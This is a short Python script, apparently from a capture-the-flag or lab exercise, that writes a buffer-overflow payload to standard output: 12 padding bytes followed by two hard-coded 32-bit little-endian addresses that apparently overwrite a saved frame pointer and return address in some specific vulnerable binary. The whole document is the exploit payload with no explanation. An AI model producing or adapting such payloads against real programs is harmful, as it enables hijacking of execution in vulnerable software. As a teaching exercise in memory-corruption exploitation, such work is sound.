from struct import pack
import sys

bytes = b'\x00' * 12 + pack("<I", 0xbffeeb98) + pack("<I", 0x0804889c)
sys.stdout.buffer.write(bytes)
